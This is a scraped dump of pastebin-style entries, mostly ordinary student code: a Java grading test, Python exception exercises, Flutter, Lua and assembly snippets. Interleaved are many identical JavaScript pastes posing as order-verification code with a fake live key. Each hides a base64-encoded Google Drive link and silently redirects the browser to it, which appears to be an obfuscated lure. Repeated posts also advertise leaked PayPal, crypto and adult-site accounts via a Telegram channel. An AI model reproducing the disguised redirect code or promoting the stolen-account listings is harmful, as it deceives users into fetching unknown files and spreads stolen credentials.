            for (int i = 1; i <= 8; i++) {
                for (int j = 1; j <= 3; j++) {
                    try {
                        faculty.addGradeToStudent(""1234"", i, ""course"" + counter, (j % 2 == 0) ? 7 : 10);
                    } catch (OperationNotAllowedException e) {
                        System.out.println(e.getMessage());
                    }
                    ++counter;
                }
            }
            System.out.println(""LOGS"");
            System.out.println(faculty.getFacultyLogs());
            System.out.println(""PRINT STUDENTS (there shouldn't be anything after this line!"");
            faculty.printFirstNStudents(2);
        } else if (testCase == 5 || testCase == 6 || testCase == 7) {
            System.out.println(""Testing addGrade and printFirstNStudents (not graduated student)"");
            Faculty faculty = new Faculty();
            for (int i = 1; i <= 10; i++) {
                faculty.addStudent(""student"" + i, ((i % 2) == 1 ? 3 : 4));
                int courseCounter = 1;
                for (int j = 1; j < ((i % 2 == 1) ? 6 : 8); j++) {
                    for (int k = 1; k <= ((j % 2 == 1) ? 3 : 2); k++) {
                        try {
                            faculty.addGradeToStudent(""student"" + i, j, (""course"" + courseCounter), i % 5 + 6);
                        } catch (OperationNotAllowedException e) {
                            System.out.println(e.getMessage());
                        }
                        ++courseCounter;
                    }
                }
            }
            if (testCase == 5)
                faculty.printFirstNStudents(10);
            else if (testCase == 6)
                faculty.printFirstNStudents(3);
            else
                faculty.printFirstNStudents(20);
        } else if (testCase == 8 || testCase == 9) {
            System.out.println(""TESTING DETAILED REPORT"");
            Faculty faculty = new Faculty();
            faculty.addStudent(""student1"", ((testCase == 8) ? 3 : 4));
            int grade = 6;
            int counterCounter = 1;
            for (int i = 1; i < ((testCase == 8) ? 6 : 8); i++) {
                for (int j = 1; j < 3; j++) {
                    try {
                        faculty.addGradeToStudent(""student1"", i, ""course"" + counterCounter, grade);
                    } catch (OperationNotAllowedException e) {
                        e.printStackTrace();
                    }
                    grade++;
                    if (grade == 10)
                        grade = 5;
                    ++counterCounter;
                }
            }
            System.out.println(faculty.getDetailedReportForStudent(""student1""));
        } else if (testCase==10) {
            System.out.println(""TESTING PRINT COURSES"");
            Faculty faculty = new Faculty();
            for (int i = 1; i <= 10; i++) {
                faculty.addStudent(""student"" + i, ((i % 2) == 1 ? 3 : 4));
                int courseCounter = 1;
                for (int j = 1; j < ((i % 2 == 1) ? 6 : 8); j++) {
                    for (int k = 1; k <= ((j % 2 == 1) ? 3 : 2); k++) {
                        int grade = sc.nextInt();
                        try {
                            faculty.addGradeToStudent(""student"" + i, j, (""course"" + courseCounter), grade);
                        } catch (OperationNotAllowedException e) {
                            System.out.println(e.getMessage());
                        }
                        ++courseCounter;
                    }
                }
            }
            faculty.printCourses();
        } else if (testCase==11) {
            System.out.println(""INTEGRATION TEST"");
            Faculty faculty = new Faculty();
            for (int i = 1; i <= 10; i++) {
                faculty.addStudent(""student"" + i, ((i % 2) == 1 ? 3 : 4));
                int courseCounter = 1;
                for (int j = 1; j <= ((i % 2 == 1) ? 6 : 8); j++) {
                    for (int k = 1; k <= ((j % 2 == 1) ? 2 : 3); k++) {
                        int grade = sc.nextInt();
                        try {
                            faculty.addGradeToStudent(""student"" + i, j, (""course"" + courseCounter), grade);
                        } catch (OperationNotAllowedException e) {
                            System.out.println(e.getMessage());
                        }
                        ++courseCounter;
                    }
                }

            }

            for (int i=11;i<15;i++) {
                faculty.addStudent(""student"" + i, ((i % 2) == 1 ? 3 : 4));
                int courseCounter = 1;
                for (int j = 1; j <= ((i % 2 == 1) ? 6 : 8); j++) {
                    for (int k = 1; k <= 3; k++) {
                        int grade = sc.nextInt();
                        try {
                            faculty.addGradeToStudent(""student"" + i, j, (""course"" + courseCounter), grade);
                        } catch (OperationNotAllowedException e) {
                            System.out.println(e.getMessage());
                        }
                        ++courseCounter;
                    }
                }
            }
            System.out.println(""LOGS"");
            System.out.println(faculty.getFacultyLogs());
            System.out.println(""DETAILED REPORT FOR STUDENT"");
            System.out.println(faculty.getDetailedReportForStudent(""student2""));
            try {
                System.out.println(faculty.getDetailedReportForStudent(""student11""));
                System.out.println(""The graduated students should be deleted!!!"");
            } catch (NullPointerException e) {
                System.out.println(""The graduated students are really deleted"");
            }
            System.out.println(""FIRST N STUDENTS"");
            faculty.printFirstNStudents(10);
            System.out.println(""COURSES"");
            faculty.printCourses();
        }
    }
}
"
Q91tZutA,Crypto Accounts,iLoveToWatch,JavaScript,Monday 28th of April 2025 05:30:09 AM CDT,79312 Accounts Posted On https://t.me/leakedbyem1nem
F7Xvhehu,Untitled,luqlegal,JavaScript,Monday 28th of April 2025 05:28:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40194/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zqPyyJVW,PayPal with Balance,iLoveToWatch,JavaScript,Monday 28th of April 2025 05:14:47 AM CDT,26508 Accounts Posted On https://t.me/leakedbyem1nem
3JApTsfE,Products.js,luqlegal,JavaScript,Monday 28th of April 2025 05:13:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46354/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BbgPE1Yy,random password generator,BojidarDosev,Python,Monday 28th of April 2025 05:08:27 AM CDT,"import random
import string

list = """"
br1 = int(20)
while br1>0:
    randnum = random.randint(0, 9)
    randstr = random.choice(string.ascii_letters)
    randsymbol = random.choice(string.punctuation)
    randnum3 = random.randint(1,3)
    if randnum3==1:
        list += str(randnum)
    elif randnum3==2:
        list += randstr
    else:
        list += randsymbol
    br1-=1
print(list)
"
rHtTeN2r,Leaked Accounts - Fresh Hits,iLoveToWatch,JavaScript,Monday 28th of April 2025 04:59:26 AM CDT,57737 Accounts Posted On https://t.me/leakedbyem1nem
bSHpeuqW,23401,boyan1324,Python,Monday 28th of April 2025 04:58:04 AM CDT,"# 1
num1, num2 = input().split(', ')
num1, num2 = num1, num2
try:
    print(int(num1) / int(num2))
except ZeroDivisionError:
    print(""You cannot divide by zero"")
except ValueError:
    print(""You cannot divide by symbol"")

# 2
numbers = [int(x) if x.isnumeric() else str(x) for x in input().split()]
try:
    if numbers:
        print(sum(numbers))
    else:
        print(""You cannot sum empty list!"")
except TypeError:
    print(""You can not sum int and str"")

# 3
number = input()
try:
    result = int(float(number))
    print(result)
except ValueError:
    print(""You can not make string to integer"")

# 4
data = input().split()
people = {}
for i in range(0, len(data), 2):
    name = data[i]
    age = int(data[i+1])
    people[name] = age
names_to_check = input().replace("" "", """").split("","")
results = []
try:
    for name in names_to_check:
        if name in people:
            results.append(str(people[name]))
        else:
            raise KeyError
    print("", "".join(results))
    print(""Those were ages of the people"")
except KeyError:
    print(""This person does not exist in this dictionary"")

# 5
data = input().split()
people = {}
for i in range(0, len(data), 2):
    name = data[i]
    age = int(data[i+1])
    people[name] = age
names_to_check = input().replace("" "", """").split("","")
people_list = list(people.keys())
results = []
try:
    for name in names_to_check:
        if name in people_list:
            results.append(name)
        else:
            raise KeyError
    print("", "".join(results))
    print(""Deletion was successful"")
except KeyError:
    print(""Element is not in the list"")
print(""This is my program"")
"
AEG5HvmS,Order.js,luqlegal,JavaScript,Monday 28th of April 2025 04:57:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21560/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6W4ZdnR5,rand num guesser,BojidarDosev,Python,Monday 28th of April 2025 04:56:52 AM CDT,"import random

num = random.randint(1,100)
userinp = int(input(""Enter a number between 1 and 100: ""))
br = 1;
while userinp != num:
    br=br+1
    if userinp > num:
        print(""Too big"")
    elif userinp < num:
        print(""Too small"")
    userinp = int(input(""Enter a number between 1 and 100: ""))

print(""You guessed it! The number was"", num)
print(""It took you "" , br , "" tries!"")"
Qu03kjEh,Untitled,kkbr11022,Lua,Monday 28th of April 2025 04:55:59 AM CDT,"local hax = script.Parent
local Face = hax.Face
local Audio = Face.Audio
--local Output = Face.Output
--local Wire = Face.Wire
--Wire.SourceInstance = Audio
--Wire.TargetInstance = Output
local Image = Face.Image
local Click = Face.Click

local Length = Audio.TimeLength
local Seq = NumberSequence.new(0, Length)
local Count = Length*10
local Playing = false
function Play()
  if Playing ~= false then return end
  assert(Audio.Asset, `Audio ""{Audio.Asset}"" is nil`)
  assert(Audio.IsReady, `Audio ""{Audio.Asset}"" is not ready.`)
  Playing=true
  local Before = Face.Size
  local function clp(x)
    return math.clamp(x, 0.05, 1)
  end
  Click:Remove()
  local Waves = Audio:GetWaveformAsync(Seq, Count)
  Audio:Play()
  for _, i in pairs(Waves) do
    local Speed = Audio.PlaybackSpeed
    local Volume = math.clamp(Audio.Volume, 0, 3)
    local Time = (Length/Count)/Speed
    i=i*10
    if i<0.2 then i=0 end
    local X,Y,Z=clp(i), clp(i), Before.Z
    Face.Size = Before+Vector3.new(X*Volume,Y*Volume,Z)
    if Time==0 then continue end
    wait(Time)
  end
  Face.Size = Before
  Audio:Stop()
  Playing=false
  Click.Parent=Face
end

Click.MouseClick:Connect(Play)"
iGziPdjq,pass parameter flutter bundle constractor,muhaiminurabir,Dart,Monday 28th of April 2025 04:47:48 AM CDT,"//sending
Navigator.pushNamed(
                      context,
                      howItWorksYoutube,
                      arguments: {
                        'tittle': CustomStrings.howItWorks,
                        'url':
                            context
                                .read<HomeProvider>()
                                .homeResponse!
                                .howItWorks!,
                      },
                    );
//from main page
howItWorksYoutube:
                (context) => YoutubeScreen(
                  args: ModalRoute.of(context)!.settings.arguments as Map,
                ),

//getting
class YoutubeScreen extends StatelessWidget {
  final Map args;

  const YoutubeScreen({super.key, required this.args});

  @override
  Widget build(BuildContext context) {
    YoutubePlayerController _controller = YoutubePlayerController(
      initialVideoId: args[""url""],
      flags: YoutubePlayerFlags(autoPlay: true, mute: false),
    );

    return Scaffold(
      appBar: PreferredSize(
        preferredSize: const Size.fromHeight(kToolbarHeight), // Set
        child: CustomAppBar(
          title: args[""tittle""],
          color: Colors.white,
          onTap: () {
            Navigator.of(context).pop();
          },
        ),
      ),
      body: YoutubePlayerBuilder(
        player: YoutubePlayer(controller: _controller),
        builder: (context, player) {
          return Column(children: [player]);
        },
      ),
    );
  }
}
"
jZyKMvUK,Chaturbate with Tokens,iLoveToWatch,JavaScript,Monday 28th of April 2025 04:44:04 AM CDT,26767 Accounts Posted On https://t.me/leakedbyem1nem
0H4PMS01,Market.js,luqlegal,JavaScript,Monday 28th of April 2025 04:42:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65326/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Nz2NBPq8,Crypto Accounts,iLoveToWatch,JavaScript,Monday 28th of April 2025 04:28:43 AM CDT,15676 Accounts Posted On https://t.me/leakedbyem1nem
Tk81Pbii,Untitled,luqlegal,JavaScript,Monday 28th of April 2025 04:27:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/00338/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3nhsxZpq,23401,boyan1324,Python,Monday 28th of April 2025 04:24:54 AM CDT,"# 1
num1, num2 = input().split(',')
num1, num2 = num1, num2
try:
    print(int(num1) / int(num2))
except ZeroDivisionError:
    print(""You cannot divide by zero"")
except ValueError:
    print(""You cannot divide by symbol"")

# 2
numbers = [int(x) if x.isnumeric() else str(x) for x in input().split()]
try:
    print(sum(numbers))
except TypeError:
    print(""You can not add symbol"")

# 3
numbers = [int(x) for x in input().split(',')]
target = input()
try:
    print(numbers[int(target)])
except IndexError:
    print('Index out of range')
except ValueError:
    print('Invalid index')

# 4
from numpy import sqrt
number = input()
try:
    if int(number) >= 0:
        print(sqrt(int(number)))
    else:
        print(""Cannot calculate square root of negative number"")
except ValueError:
    print(""Invalid input"")

# 5
num1, num2 = input().split(',')
try:
    print(int(num1) % int(num2))
except ZeroDivisionError:
    print(""You can not divide by ZERO"")
except ValueError:
    print(""Invalid input"")

# 6
number = input()
try:
    print(int(number))
except ValueError:
    print(""Conversion Error"")

# 7
num1, num2 = input().split(',')
try:
    print(int(num1) - int(num2))
except ValueError:
    print(""Invalid input"")

# 8
n = int(input())
my_dict = {}
for i in range(2):
    key, value = input().split(',')
    my_dict[key] = int(value)
target = input()
try:
    print(my_dict[target])
except KeyError:
    print(""Key not found"")

# 9
num1, num2 = input().split(',')
try:
    print(int(num1) + int(num2))
except ValueError:
    print(""Invalid input"")"
DuWH27bk,PayPal with Balance,iLoveToWatch,JavaScript,Monday 28th of April 2025 04:13:22 AM CDT,49736 Accounts Posted On https://t.me/leakedbyem1nem
0VXwBKg4,Market.js,iLoveToWatch,JavaScript,Monday 28th of April 2025 04:11:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29056/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dW3z1Uka,youtube view youtube player flutter,muhaiminurabir,Dart,Monday 28th of April 2025 04:05:53 AM CDT,"import 'package:flutter/material.dart';
import 'package:labbayk/core/widgets/global_appbar.dart';
import 'package:youtube_player_flutter/youtube_player_flutter.dart';

class YoutubeScreen extends StatelessWidget {
  final String url;
  final String title;

  const YoutubeScreen({super.key, required this.url, required this.title});

  @override
  Widget build(BuildContext context) {
    YoutubePlayerController _controller = YoutubePlayerController(
      initialVideoId: url,
      flags: YoutubePlayerFlags(
        autoPlay: true,
        mute: false,
      ),
    );

    return Scaffold(
        appBar: GlobalAppBar(title: title, cangoBack: true),
        body: YoutubePlayerBuilder(
            player: YoutubePlayer(
              controller: _controller,
            ),
            builder: (context, player) {
              return Column(
                children: [
                  player,
                ],
              );
            }));
  }
}"
K1JLkjq9,Crypto Accounts,Xp_Isolation,JavaScript,Monday 28th of April 2025 03:57:56 AM CDT,35550 Accounts Posted On https://t.me/leakedbyem1nem
TAMRQhda,Untitled,iLoveToWatch,JavaScript,Monday 28th of April 2025 03:56:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66639/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YFUVwjY4,PayPal with Balance,Xp_Isolation,JavaScript,Monday 28th of April 2025 03:42:32 AM CDT,05857 Accounts Posted On https://t.me/leakedbyem1nem
UPJamfyj,Market.js,Xp_Isolation,JavaScript,Monday 28th of April 2025 03:40:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18312/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
79KRRRyR,Crypto Accounts,rodrigomaise99,JavaScript,Monday 28th of April 2025 03:27:08 AM CDT,08064 Accounts Posted On https://t.me/leakedbyem1nem
2RnUUMCk,Untitled,Xp_Isolation,JavaScript,Monday 28th of April 2025 03:25:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51595/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3w8PBHC2,Loading Screen Manager,Cakey3101,Lua,Monday 28th of April 2025 03:22:14 AM CDT,"local ContentProvider = game:GetService(""ContentProvider"")
local ReplicatedFirst = game:GetService(""ReplicatedFirst"")

local Assets = game:GetDescendants()

local Frame = script.Parent.Frame

local function LoadingLoop()
	Frame.Visible = true
	
	for i = 1, #Assets do
		ContentProvider:PreloadAsync({Assets[i]})
		
		local Percentage = math.floor(i / #Assets * 100)
		
		Frame.ProgressFrame.Assets.Text = `Assets Loaded: {i} / {#Assets}`
		
		Frame.ProgressFrame.Progress:TweenSize(UDim2.fromScale(Percentage / 100, 1), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 0.1, true)
	end
	
	task.wait(1)
	
	
	Frame:TweenSizeAndPosition(UDim2.fromScale(0, 0), UDim2.fromScale(0.5, 1.5), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1)
	task.wait(1.5)
	Frame.Visible = false
end

LoadingLoop()

ReplicatedFirst:RemoveDefaultLoadingScreen()"
djRJFdX3,Untitled,Artychenal,6502 TASM/64TASS,Monday 28th of April 2025 03:19:20 AM CDT,"DATA SEGMENT
    messtr       DB 0Dh, 0Ah, ""Hello! Let`s solve piecewise function with your values"", 0Dh, 0Ah, ""$""
    funct        DB "" { x-1, if x < 10"", 0Dh, 0Ah, ""Z= { (3x^2+4)/(x-2), if x = 10"", 0Dh, 0Ah, "" { (7x^2-56)/(2x-5), if x > 10"", 0Dh, 0Ah, ""$""
    xreadmes     DB ""Input value of x (range -32767...32767,but correct result for -32767 ... 68) -> $""
    xinmes       DB 7,?, 7 DUP ("" "")
    menuhold     DB 2,?, 2 DUP ("" "")
    xvalue       DW ?
    out_msg      DB ""Result: $""
    newline      DB 0Dh,0Ah,""$""
    err_msg      DB 0Dh, 0Ah, ""Invalid input!"", 0Dh, 0Ah, ""$""
    range_err    DB ""Number out of range!"", 0Dh, 0Ah, ""$""
    overflow_err DB ""Calculation overflow occurred!"", 0Dh, 0Ah, ""$""
    reminder_msg DB "" reminder $""
    end_msg      DB ""Do you want to continue? (y/n): $""
    result       DW ?
    remainder    DW ?
    numerator    DW ?
    denominator  DW ?
    sign_flag    DB 0
    temp_reg     DW ?
DATA ENDS
STSEG SEGMENT PARA STACK ""STACK""
          DB 64 DUP ( ""STACK"" )
STSEG ENDS
CODE SEGMENT
                         ASSUME CS:CODE, DS:DATA, SS:STSEG
    START:               
                         MOV    AX, DATA
                         MOV    DS, AX
                         CALL   WELC_PROC
                         CALL   FUNC
                         CALL   PRINTING
                         CALL   END_PROGRAM
                         MOV    AH, 10
                         INT    21h
WELC_PROC PROC
                         MOV    DX, OFFSET messtr
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET funct
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET xreadmes
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET xinmes
                         MOV    AH, 10
                         INT    21h
                         CALL   CHECK_INPUT
                         MOV    SI, OFFSET xinmes
                         ADD    SI, 2
                         CALL   CONVERT
                         MOV    xvalue, BX
                         MOV    sign_flag, 0
                         RET
WELC_PROC ENDP
CHECK_INPUT PROC
                         MOV    SI, DX
                         MOV    CL, [SI+1]
                         MOV    BL, 0
                         ADD    SI, 2
                         MOV    AL, [SI]
                         CMP    AL, '-'
                         JNE    CHECK_DIGITS
                         MOV    sign_flag, 1
                         INC    SI
                         DEC    CX
                         JZ     INVALID_INPUT
    CHECK_DIGITS:        
                         MOV    AL, [SI]
                         CMP    CX, 0
                         JZ     END_CHECK
    CHECK_LOOP:          
                         MOV    AL, [SI]
                         CMP    AL, '0'
                         JB     INVALID_INPUT
                         CMP    AL, '9'
                         JA     INVALID_INPUT
                         INC    BL
                         INC    SI
                         DEC    CX
                         JNZ    CHECK_LOOP
                         CMP    BL, 0
                         JZ     INVALID_INPUT
                         JMP    END_CHECK
    INVALID_INPUT:       
                         MOV    DX, OFFSET err_msg
                         MOV    AH, 9
                         INT    21h
                         JMP    END_ERROR
    END_ERROR:           
                         JMP    START
    END_CHECK:           
                         RET
CHECK_INPUT ENDP
CHECK_RANGE PROC
                         CMP    sign_flag, 0
                         JE     CHECK_NEGATIVE
                         NEG    AX
                         CMP    remainder, 0
                         JNE    CHECK_NEGATIVE
                         CMP    DX, 0
                         JNE    RANGE_ERROR
    CHECK_NEGATIVE:      
                         CMP    AX, 32767
                         JA     RANGE_ERROR
                         CMP    sign_flag, 0
                         JNE    NEG_N
                         RET
    RANGE_ERROR:         
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET range_err
                         MOV    AH, 9
                         INT    21h
                         CALL   END_PROGRAM
    NEG_N:               
                         NEG    AX
                         RET
CHECK_RANGE ENDP
CHECK_RANGE_RESULT PROC
                         MOV    AX, result
                         CMP    AX, -32768
                         JA     RANGE_ERROR_RES
                         CMP    AX, 32752
                         JG     RANGE_ERROR_RES
                         RET
    RANGE_ERROR_RES:     
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET range_err
                         MOV    AH, 9
                         INT    21h
                         JMP    START
CHECK_RANGE_RESULT ENDP
CONVERT PROC
                         XOR    AX, AX
                         XOR    BX, BX
                         PUSH   AX
                         PUSH   BX
                         PUSH   CX
                         PUSH   DX
                         MOV    BX, 0
                         CMP    sign_flag, 1
                         JNE    CONVERT_LOOP
                         INC    SI
                         DEC    CX
    CONVERT_LOOP:        
                         MOV    AL, [SI]
                         CMP    AL, '0'
                         JB     CONVERT_END
                         CMP    AL, '9'
                         JA     CONVERT_END
                         SUB    AL, '0'
                         MOV    AH, 0
                         PUSH   AX
                         MOV    AX, BX
                         MOV    CX, 10
                         MUL    CX
                         CMP    DX, 0
                         JNE    OVERFLOW_ERROR
                         MOV    BX, AX
                         POP    AX
                         ADD    BX, AX
                         INC    SI
                         JMP    CONVERT_LOOP
    OVERFLOW_ERROR:      
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET range_err
                         MOV    AH, 9
                         INT    21h
                         JMP    START
    CONVERT_END:         
                         CMP    sign_flag, 1
                         JNE    CONVERT_FINISH
                         NEG    BX
